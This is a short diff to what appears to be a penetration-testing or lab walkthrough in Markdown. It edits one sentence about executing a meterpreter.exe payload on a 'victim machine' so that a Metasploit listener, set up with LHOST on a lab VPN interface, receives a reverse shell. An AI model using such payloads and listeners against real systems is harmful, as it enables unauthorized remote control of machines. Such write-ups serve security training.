@@ -187,4 +187,4 @@ set LHOST tun0
 run
 ```
 
-Execute `meterpreter.exe` on the victim machine and that's it.
+Execute `meterpreter.exe` on the victim machine and the listener should pop a meterpreter shell.
